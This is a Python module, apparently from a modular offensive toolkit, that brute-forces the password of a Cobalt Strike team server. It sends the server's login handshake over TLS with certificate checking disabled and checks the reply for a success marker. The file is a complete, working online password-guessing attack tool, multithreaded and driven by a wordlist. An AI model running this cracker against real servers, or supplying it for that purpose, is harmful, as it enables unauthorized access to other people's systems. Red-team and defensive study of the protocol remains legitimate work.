#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import time
import socket
import ssl
import concurrent.futures
import sys
from rich.console import Console
from rich.table import Table

class Module:
    def __init__(self, logger):
        self.logger = logger
        self.options = {
            "host": {"value": None, "required": True},
            "port": {"value": 50050, "required": True},
            "wordlist": {"value": None, "required": True},
            "threads": {"value": 10, "required": True},
        }

    def info(self):
        console = Console()
        table = Table()
        table.add_column("Author")
        table.add_column("Module description")
        table.add_column("Other")
        table.add_row("JustYooMoon","cobaltstrike teamserver password cracking module","-")
        console.print(table)
        
    def run(self):
        for key in self.options:
            if (
                self.options[key]["value"] is None
                and self.options[key]["required"] is True
            ):
                self.logger.error("Required key {} is not set".format(key))
                return
            else:
                host =  self.options["host"]["value"]
                port =  self.options["port"]["value"]
                wordlist =  self.options["wordlist"]["value"]
                threads =  self.options["threads"]["value"]
                #print("[+] target: {}".format(target))
                #print("[+] wordlist: {}".format(wordlist))
                #print("[+] threads: {}".format(threads))
                      
 


 
 
                class NotConnectedException(Exception):
                    def __init__(self, message=None, node=None):
                        self.message = message
                        self.node = node
                
                
                class DisconnectedException(Exception):
                    def __init__(self, message=None, node=None):
                        self.message = message
                        self.node = node
                
                
                class Connector:
                    def __init__(self):
                        self.sock = None
                        self.ssl_sock = None
                        self.ctx = ssl.SSLContext()
                        self.ctx.verify_mode = ssl.CERT_NONE
                        pass
                
                    def is_connected(self):
                        return self.sock and self.ssl_sock
                
                    def open(self, hostname, port):
                        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.sock.settimeout(10)
                        self.ssl_sock = self.ctx.wrap_socket(self.sock)
                
                        if hostname == socket.gethostname():
                            ipaddress = socket.gethostbyname_ex(hostname)[2][0]
                            self.ssl_sock.connect((ipaddress, port))
                        else:
                            self.ssl_sock.connect((hostname, port))
                
                    def close(self):
                        if self.sock:
                            self.sock.close()
                        self.sock = None
                        self.ssl_sock = None
                
                    def send(self, buffer):
                        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
                        self.ssl_sock.sendall(buffer)
                
                    def receive(self):
                        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
                        received_size = 0
                        data_buffer = b""
                
                        while received_size < 4:
                            data_in = self.ssl_sock.recv()
                            data_buffer = data_buffer + data_in
                            received_size += len(data_in)
                
                        return data_buffer
                
                
                def passwordcheck(password):
                    if len(password) > 0:
                        result = None
                        conn = Connector()
                        conn.open(host,port)
                        payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(
                            bytes(password, "ascii").ljust(256, b"A"))
                        conn.send(payload)
                        if conn.is_connected(): result = conn.receive()
                        if conn.is_connected(): conn.close()
                        if result == bytearray(b"\x00\x00\xca\xfe"):
                            return password
                        else:
                            return False
                    else:
                        print("[-] Ignored blank password")
                
                passwords = []



                print("[+] Wordlist: {}".format(wordlist))
                passwords = open(wordlist).read().split("\n")

                
                if len(passwords) > 0:
                
                    print("[+] Word Count: {}".format(len(passwords)))
                    print("[+] Threads: {}".format(threads))
                
                    start = time.time()


                
                    attempts = 0
                    failures = 0
                
                    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                
                        future_to_check = {executor.submit(passwordcheck, password): password for password in passwords}
                        for future in concurrent.futures.as_completed(future_to_check):
                            password = future_to_check[future]
                            try:
                                data = future.result()
                                attempts = attempts + 1
                                if data:
                                    
                                    print("\033[32m[SUCCESS] Found Password: {}\033[0m".format(password))
                                    break
                                
                                    #print("[+] Found Password: {}".format(password))#!/usr/bin/env python3
                            except Exception as exc:
                                failures = failures + 1
                                print('[+] %r generated an exception: %s' % (password, exc))
                    break